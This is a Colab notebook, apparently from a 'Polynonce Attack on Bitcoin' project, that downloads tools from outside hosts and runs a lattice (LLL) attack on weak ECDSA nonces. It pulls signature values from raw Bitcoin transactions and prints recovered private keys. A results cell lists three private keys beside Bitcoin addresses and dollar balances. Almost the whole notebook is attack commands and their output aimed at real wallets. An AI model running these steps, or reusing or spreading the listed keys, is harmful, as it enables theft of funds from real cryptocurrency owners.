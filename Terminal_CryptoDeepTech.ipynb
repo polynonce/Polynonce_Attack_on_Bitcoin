{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "# www.polynonce.ru\n",
        "# https://github.com/polynonce/Polynonce_Attack_on_Bitcoin\n",
        "# Инновационные технологии, полный комплекс методов и средств для внедрения новшеств, цифровых товаров и услуг.\n",
        "# POLYNONCE ATTACK используем подписи BITCOIN как полиному в произвольно высокой степени 128 bits для получение приватного ключа"
      ],
      "metadata": {
        "id": "ov7DoqNVfPGE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://cryptodeeptech.ru/sage-9.3-Ubuntu_20.04-x86_64.tar.bz2\n",
        "!tar -xf sage-9.3-Ubuntu_20.04-x86_64.tar.bz2"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Yvq_NX0cfO_3",
        "outputId": "4bd2bd4f-f930-4e60-b681-2e861ff7e90e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2023-08-09 08:53:31--  https://cryptodeeptech.ru/sage-9.3-Ubuntu_20.04-x86_64.tar.bz2\n",
            "Resolving cryptodeeptech.ru (cryptodeeptech.ru)... 81.177.33.245\n",
            "Connecting to cryptodeeptech.ru (cryptodeeptech.ru)|81.177.33.245|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 3024213243 (2.8G) [application/x-bzip2]\n",
            "Saving to: ‘sage-9.3-Ubuntu_20.04-x86_64.tar.bz2’\n",
            "\n",
            "sage-9.3-Ubuntu_20. 100%[===================>]   2.82G  14.1MB/s    in 3m 0s   \n",
            "\n",
            "2023-08-09 08:56:32 (16.1 MB/s) - ‘sage-9.3-Ubuntu_20.04-x86_64.tar.bz2’ saved [3024213243/3024213243]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd SageMath/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "TDokOzDdfO53",
        "outputId": "075a67c1-5786-4381-c37b-a8f1dd93236f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/SageMath\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "clOVb4i6gV8_",
        "outputId": "d4e913a4-dc28-46a9-90c9-0d1d039d3460"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;32mbootstrap\u001b[0m*      configure.ac              \u001b[01;34mlogs\u001b[0m/               \u001b[01;32msage\u001b[0m*\n",
            "\u001b[01;34mbuild\u001b[0m/          COPYING.txt               \u001b[01;34mm4\u001b[0m/                 \u001b[01;34msrc\u001b[0m/\n",
            "condarc.yml     \u001b[01;34mdocker\u001b[0m/                   Makefile            tox.ini\n",
            "\u001b[01;34mconfig\u001b[0m/         environment-optional.yml  pyrightconfig.json  \u001b[01;34mupstream\u001b[0m/\n",
            "\u001b[01;32mconfig.status\u001b[0m*  environment.yml           README.md           VERSION.txt\n",
            "\u001b[01;32mconfigure\u001b[0m*      \u001b[01;34mlocal\u001b[0m/                    \u001b[01;32mrelocate-once.py\u001b[0m*\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!python3 relocate-once.py"
      ],
      "metadata": {
        "id": "9dK6qUUZgVte"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!pip3 install bitcoin\n",
        "!pip3 install ecdsa"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9Fzapd9Lgken",
        "outputId": "fd4bda51-df0c-4361-b8e5-1c27a22eec83"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting bitcoin\n",
            "  Downloading bitcoin-1.1.42.tar.gz (36 kB)\n",
            "  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: bitcoin\n",
            "  Building wheel for bitcoin (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for bitcoin: filename=bitcoin-1.1.42-py3-none-any.whl size=44402 sha256=ff702f53fa7ff33cf8049ab53766f749c9badaa296ad088b6e7cb8e2f9a0180e\n",
            "  Stored in directory: /root/.cache/pip/wheels/a3/98/a1/0d53f5b714680bb5dffc2db778c221b1f5c54bc4a3a779c8c5\n",
            "Successfully built bitcoin\n",
            "Installing collected packages: bitcoin\n",
            "Successfully installed bitcoin-1.1.42\n",
            "Collecting ecdsa\n",
            "  Downloading ecdsa-0.18.0-py2.py3-none-any.whl (142 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m142.9/142.9 kB\u001b[0m \u001b[31m2.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hRequirement already satisfied: six>=1.9.0 in /usr/local/lib/python3.10/dist-packages (from ecdsa) (1.16.0)\n",
            "Installing collected packages: ecdsa\n",
            "Successfully installed ecdsa-0.18.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://raw.githubusercontent.com/demining/CryptoDeepTools/main/20PolynonceAttack/crack_weak_ECDSA_nonces_with_LLL.py"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4iDlQet3gfBh",
        "outputId": "7c9e4b58-4110-4f6e-e145-8037ab922d8a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2023-08-09 09:12:19--  https://raw.githubusercontent.com/demining/CryptoDeepTools/main/20PolynonceAttack/crack_weak_ECDSA_nonces_with_LLL.py\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 2607 (2.5K) [text/plain]\n",
            "Saving to: ‘crack_weak_ECDSA_nonces_with_LLL.py’\n",
            "\n",
            "\r          crack_wea   0%[                    ]       0  --.-KB/s               \rcrack_weak_ECDSA_no 100%[===================>]   2.55K  --.-KB/s    in 0s      \n",
            "\n",
            "2023-08-09 09:12:19 (33.7 MB/s) - ‘crack_weak_ECDSA_nonces_with_LLL.py’ saved [2607/2607]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./sage -sh"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6y47lldyge5I",
        "outputId": "93d843ac-a799-4f60-eb3d-dc19ba17ec2e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Starting subshell with Sage environment variables set.  Don't forget\n",
            "to exit when you are done.  Beware:\n",
            " * Do not do anything with other copies of Sage on your system.\n",
            " * Do not use this for installing Sage packages using \"sage -i\" or for\n",
            "   running \"make\" at Sage's root directory.  These should be done\n",
            "   outside the Sage shell.\n",
            "\n",
            "Bypassing shell configuration files...\n",
            "\n",
            "Note: SAGE_ROOT=/content/SageMath\n",
            "bash: cannot set terminal process group (844): Inappropriate ioctl for device\n",
            "bash: no job control in this shell\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ chmod +x polynonce\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ ./polynonce -list\n",
            "  -tool:   flood_attack\n",
            "  -tool:   the_51_attack\n",
            "  -tool:   side_channel_attack\n",
            "  -tool:   known_plaintext_attack\n",
            "  -tool:   microarchitectural_data_sampling_attack\n",
            "  -tool:   polynonce_attack\n",
            "  -tool:   pre_play_attack\n",
            "  -tool:   preimage_attack\n",
            "  -tool:   meet_in_the_middle_attack\n",
            "  -tool:   chosen_ciphertext_attack\n",
            "  -tool:   tresor_attack\n",
            "  -tool:   crime_attack\n",
            "  -tool:   vector76_attack\n",
            "  -tool:   distinguishing_attack\n",
            "  -tool:   3_subset_meet_in_the_middle_attack\n",
            "  -tool:   power_analysis_attack\n",
            "  -tool:   length_extension_attack\n",
            "  -tool:   downgrade_attack\n",
            "  -tool:   dictionary_attack\n",
            "  -tool:   blockchain_reorganization_attack\n",
            "  -tool:   drown_attack\n",
            "  -tool:   rebound_attack\n",
            "  -tool:   dma_attack\n",
            "  -tool:   lattice_attack\n",
            "  -tool:   lucky_thirteen_attack\n",
            "  -tool:   slide_attack\n",
            "  -tool:   small_subgroup_confinement_attack\n",
            "  -tool:   boomerang_attack\n",
            "  -tool:   coppersmiths_attack\n",
            "  -tool:   differential_linear_attack\n",
            "  -tool:   electromagnetic_attack\n",
            "  -tool:   fluhrer_mantin_and_shamir_attack\n",
            "  -tool:   swapgs_attack_security_vulnerability\n",
            "  -tool:   tlbleed_attack\n",
            "  -tool:   collision_attack\n",
            "  -tool:   custom_hardware_attack\n",
            "  -tool:   pass_the_hash_attack\n",
            "  -tool:   correlation_attack\n",
            "  -tool:   roca_vulnerability_attack\n",
            "  -tool:   passive_attack\n",
            "  -tool:   padding_oracle_attack\n",
            "  -tool:   the_sybil_attack\n",
            "  -tool:   wieners_attack\n",
            "  -tool:   acoustic_cryptanalysis_attack\n",
            "  -tool:   time_memory_data_tradeoff_attack\n",
            "  -tool:   tempest_attack_codename\n",
            "  -tool:   load_value_injection_attack\n",
            "  -tool:   meltdown_attack_security_vulnerability\n",
            "  -tool:   rowhammer_attack\n",
            "  -tool:   majority_attack\n",
            "  -tool:   ciphertext_only_attack\n",
            "  -tool:   race_attack\n",
            "  -tool:   partial_matching_meet_in_the_middle_attack\n",
            "  -tool:   related_key_attack\n",
            "  -tool:   interpolation_attack\n",
            "  -tool:   man_in_the_middle_attack\n",
            "  -tool:   random_number_generator_attack\n",
            "  -tool:   foreshadow_attack\n",
            "  -tool:   rsa_factoring_challenge_attack\n",
            "  -tool:   davies_attack\n",
            "  -tool:   replay_attack\n",
            "  -tool:   breach_attack\n",
            "  -tool:   birthday_attack\n",
            "  -tool:   cold_boot_attack\n",
            "  -tool:   chosen_plaintext_attack\n",
            "  -tool:   supply_chain_attack\n",
            "  -tool:   known_key_distinguishing_attack\n",
            "  -tool:   brute_force_attack\n",
            "  -tool:   frey_ruck_attack\n",
            "  -tool:   finney_attack\n",
            "  -tool:   whitebox_attack\n",
            "  -tool:   twist_attack\n",
            "  -tool:   timing_attack\n",
            "  -tool:   logjam_attack\n",
            "  -tool:   differential_fault_analysis_attack\n",
            "  -tool:   transient_execution_cpu_vulnerability_attack\n",
            "  -tool:   biclique_attack\n",
            "  -tool:   cube_attack\n",
            "  -tool:   bit_flipping_attack\n",
            "  -tool:   spectre_attack_security_vulnerability\n",
            "  -tool:   key_recovery_attack\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ echo '02000000019e3de154f8b473a796b9e39dd279dff1d907a4d27a1d8b23a055f97b08ad4c6e310000006b483045022100b29bdfc27ddf6bebd0e77c84b31dc1bc64b5b2276c8d4147421e96ef85467e8d02204ddd8ff0ffa19658e3b417be5f64d9c425a4d9fcd76238b8538c1d605b229baf0121027b06fe78e39ced37586c42c9ac38d7b2d88ccdd4cd1bb38816c0933f9b8db695ffffffff0169020000000000001600145fc8e854994406f93ea5c7f3abccc5d319ae2a3100000000' > RawTX.txt\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ ./polynonce -tool polynonce_attack -open RawTX.txt -save SignatureRSZ.csv\n",
            "1111,b29bdfc27ddf6bebd0e77c84b31dc1bc64b5b2276c8d4147421e96ef85467e8d,4ddd8ff0ffa19658e3b417be5f64d9c425a4d9fcd76238b8538c1d605b229baf,affb4ccdb7bc378e7820bc206f79e3fc0d574cd7bb4b3af69f443b2ad9ec3292,0000\n",
            "1111,748311c8b7d65eb94f0649473334e5232c32e4c3d63d13dda7d1cc99d1db6399,6acff276f4bd98184b19dcc545db63dccc07a39b6e040c8b9fda9fc2f184b44d,b38980d29a5a21ebc2c914be5d6b641d487852a39658f0267f7c6bfc28620f5a,0000\n",
            "1111,d8452a9f44f4a3ac2984d6a64cd80ae328b34f29bd72c309e88438e070e3b39e,ddf83490e1b5c10037be0385af57a563de76a83dccc7ebf4fa33b17f9d0db412,29e380d808b7d172d7f40dc77356109a60074655be5b68a3410b0f71f258337a,0000\n",
            "1111,850d026ceafd1d7e9ecf5a0e521beda0a461f8d336c27bf89944e87301c68529,fd22c2b65ff0969e3e67981e4a3bac0e87d3d123248d56c6a3c07ddbc24072b,197c8f7e0d4953587eff3f4f816d5ab06bb5f0c619fa2b3a4c006417a056eb16,0000\n",
            "\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ python3 crack_weak_ECDSA_nonces_with_LLL.py SignatureRSZ.csv 128 4\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:551: DeprecationWarning: invalid escape sequence \\d\n",
            "  search = re.compile('cpu\\d')\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1468: DeprecationWarning: invalid escape sequence \\s\n",
            "  _private_re=re.compile(b\"Private.*:\\s+(\\d+)\"),\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1469: DeprecationWarning: invalid escape sequence \\s\n",
            "  _pss_re=re.compile(b\"Pss.*:\\s+(\\d+)\"),\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1470: DeprecationWarning: invalid escape sequence \\s\n",
            "  _swap_re=re.compile(b\"Swap.*:\\s+(\\d+)\")):\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1583: DeprecationWarning: invalid escape sequence \\d\n",
            "  def num_ctx_switches(self, _ctxsw_re=re.compile(b'ctxt_switches:\\t(\\d+)')):\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1596: DeprecationWarning: invalid escape sequence \\d\n",
            "  def num_threads(self, _num_threads_re=re.compile(b'Threads:\\t(\\d+)')):\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1652: DeprecationWarning: invalid escape sequence \\d\n",
            "  self, _re=re.compile(b\"Cpus_allowed_list:\\t(\\d+)-(\\d+)\")):\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1814: DeprecationWarning: invalid escape sequence \\d\n",
            "  def uids(self, _uids_re=re.compile(b'Uid:\\t(\\d+)\\t(\\d+)\\t(\\d+)')):\n",
            "/content/SageMath/local/lib/python3.9/site-packages/psutil/_pslinux.py:1820: DeprecationWarning: invalid escape sequence \\d\n",
            "  def gids(self, _gids_re=re.compile(b'Gid:\\t(\\d+)\\t(\\d+)\\t(\\d+)')):\n",
            "Using: 4 sigs...\n",
            "f0a3e31646ce147bbd79bb6e45e6e9c8c4e51c535918c9b4cdca9528eb62172d\n",
            "8847e3bd04d33a962ddab7da9e853ebccf0c447043ac43c9801bb9554a5d842c\n",
            "72ac290c44d76b8dd6038264119e4fb2abaacda1ec7fa2bbcf08846967aaafd8\n",
            "a5fafbf64d5a2497347835e5bd4e5fe87ee6b85335d1249eb18aec655f3fbb8d\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ rm *.txt\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ rm *.csv\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ chmod +x polynonce\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ echo '010000000103ebc5c4b817124d45ad15e398ec32e9b9b7549c1fc10300ecbf36648c3cb5d42c0000006a47304402204e97dae0ab6e4eee9529f68687907c05db9037d9fbdba78dd01a3338a48d95b602207794cb7aa308243dfbdd5c20225777cd6e01bd7c4f76bf36948aa29290129c2b0121036360352efcff6a823eabb25578a29392eab4d302955fd54ece900578d2ab83b8ffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000' > RawTX.txt\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ ./polynonce -tool polynonce_attack -open RawTX.txt -save SignatureRSZ.csv\n",
            "1111,4e97dae0ab6e4eee9529f68687907c05db9037d9fbdba78dd01a3338a48d95b6,7794cb7aa308243dfbdd5c20225777cd6e01bd7c4f76bf36948aa29290129c2b,a781b30b1ea995c2380abc774a938e0b79bee6ecc0f61dd2dd2d3e44c7a24d44,0000\n",
            "1111,a10ea447dffa200513c5606585b11e3adc03b7684261003f21c4e77ab2ba47a6,ad7af458b868a6a43ee738ad8de3963aab47b85ec6476fc1f2d10652ebf9fb78,73aaae1608e526ae320c1d86e76294ab0f268fbc25af25c3ad79ec7fd285ba1e,0000\n",
            "1111,3af2ad9340e56b0f0e5acc03dfcd734d08d99b141e8072fd3700fb872799a3be,c27f9c5823b97a1d766d084ff9b4b2487eea5a618b9ce44e67f962875653dfa0,e1a918ad8bc9b5f0dd88e5b1202431c64c3d6c43e91f2b1557d3d46f8a487e42,0000\n",
            "1111,f64d54700b8d59c704a4271fb020dcbb80518ff6cc98e7c0360e02ae1e7842be,586a6b878eb880bf879b1a81df7820c096cd82beefe4c61f200d614200d4e11a,553662cfbb7c5711bdf0e2cb0283a938de778029903b761556ea5fb5b90c6c7b,0000\n",
            "\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ python3 crack_weak_ECDSA_nonces_with_LLL.py SignatureRSZ.csv 128 4\n",
            "Using: 4 sigs...\n",
            "abfe7c936e97dcb4c9c6d8903a43ea5d09c2109d030b43078fe3067d2571a288\n",
            "ff0178fa717374f7e74d43f00150748967ea04b64241ec10a10f62debb70868c\n",
            "28770085dfe61b2e65660487f46d13ca19f6a1ccca7be050e1d4efac7a3ecbd9\n",
            "a4181a2a15506a7cd94b80ce1d40f1ec7a92295902cb344e6941ed88daa58ad2\n",
            "95a03228494bcd29e3fa3d1b5703bd3179e45c400e3daa33e211d8ffb939e564\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ rm *.txt\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ rm *.csv\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ chmod +x polynonce\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ echo '01000000016eb80d35b08164302e49f88d8f86bf2827a91a5650149be38f4f73751ff41437060000006a473044022043d4c025a0f3be366a0d768c721b9b9191e0c3db6f2c6bfe34e8fb24af7f379102205a4fe2cc6944e00309c35619ff1242301b84d4728b863f97326f56dbd7a782220121027ccccf5f56ed78c2a761721ff3da0f76b792fbe4eae2ac73e7b4651bc3ef19cdffffffff01c057010000000000232103bec42e5d718b0e5b3853243c9bcf00dd671a335b0eb99fd8ca32f8d5784a9476ac00000000' > RawTX.txt\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ ./polynonce -tool polynonce_attack -open RawTX.txt -save SignatureRSZ.csv\n",
            "1111,43d4c025a0f3be366a0d768c721b9b9191e0c3db6f2c6bfe34e8fb24af7f3791,5a4fe2cc6944e00309c35619ff1242301b84d4728b863f97326f56dbd7a78222,d7460c5b1a98f6d0443ae1cfe1f1781487950836ce05c82c79893f822efd1db0,0000\n",
            "1111,2767668006c90426ca64e4a8991791ef39c7189b055b307c1f253092d403ba08,7401ac82ab2c4da29bda2c700b5a320ce150258dbf8c47e08b2e28ad9238a54b,be85bd74676e93040be459e543c521ec9123a277a1d8e043933fb299e0e1e389,0000\n",
            "1111,f29a3543a33bc9b054150e95f40ec7235c250fcc534fd2ae1994d9a336a8a90f,c558dd2ccc4b772a26662aa76c91bd41cc48d0a66be3ffb0dfba457c9cb451b9,6c77d36a42fa9dfa302f7ec60bcc1941eeac8608ec5449af84399977b016c43c,0000\n",
            "1111,f09084e704f6c1386de589435dd848c3f3f33baa5814184481cef32f5af50630,a803930d35930a83dc945ed8fcd073fe6cdf435887de674c4ea7c3dafc210ba0,ceba580a399a681b6b554b5553607ee624c24b9e2b7d833187159011127e0657,0000\n",
            "\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ python3 crack_weak_ECDSA_nonces_with_LLL.py SignatureRSZ.csv 128 4\n",
            "Using: 4 sigs...\n",
            "412344243cb1b2cbf5b000ffa156f794d822eafd469a5f1f3879109de879be7b\n",
            "fbc50a7158b3d9fd7fd58fe0874f20c10c650975dc118163debf442a44203fdf\n",
            "7aa5843e5b032f6ec5ce506ae3ad0c8bcf59680f3c3e59ced361902892d5626d\n",
            "9b7c6e53bac837e572e50b89a3dcc9547882a00f049f6d7b41edc272097a941a\n",
            "3c0d348a74600ca3084dc68b1e423d6ed2ea236c79ca2b09dab41be8c4d537be\n",
            "\u001b[?2004h\u001b[7m(sage-sh)\u001b[m root@ab812f687bd6:SageMath$ "
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n",
        "# RESULT:\n",
        "\n",
        "\n",
        "# PrivateKey = f0a3e31646ce147bbd79bb6e45e6e9c8c4e51c535918c9b4cdca9528eb62172d\n",
        "\n",
        "# BitcoinAddress = 1DxzwX4qC9PsWDSAzuWbJRzEwdGx3n9CJB\n",
        "\n",
        "# BALANCE: $ 3699.40\n",
        "\n",
        "\n",
        "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n",
        "\n",
        "\n",
        "# PrivateKey = ff0178fa717374f7e74d43f00150748967ea04b64241ec10a10f62debb70868c\n",
        "\n",
        "# BitcoinAddress = 137a6fqt13bhtAkGZWrgcGM98NLCotszR2\n",
        "\n",
        "# BALANCE: $ 1133.73\n",
        "\n",
        "\n",
        "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n",
        "\n",
        "\n",
        "# PrivateKey = fbc50a7158b3d9fd7fd58fe0874f20c10c650975dc118163debf442a44203fdf\n",
        "\n",
        "# BitcoinAddress = 1HxrEeC2X8UEcSvsemPJtTqrnbAetGWYUt\n",
        "\n",
        "# BALANCE: $ 459.24\n",
        "\n",
        "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
      ],
      "metadata": {
        "id": "9O4ONuQWgm-O"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "mZ-S5TZJgmt9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## **[\"YouTube Channel\"](https://www.youtube.com/@POLYNONCE)**"
      ],
      "metadata": {
        "id": "VmiuzBsFnr-b"
      }
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "-MssOEUso0bl"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## **[\"Telegram Channel\"](https://t.me/s/polynonce/)**"
      ],
      "metadata": {
        "id": "I6ywdNRXo1Fi"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "74SMC1b3ZhRz"
      },
      "source": [],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## **[GITHUB: \"TerminalGoogleColab\"](https://github.com/demining/TerminalGoogleColab)**"
      ],
      "metadata": {
        "id": "R5n0OjnmWYry"
      }
    }
  ]
}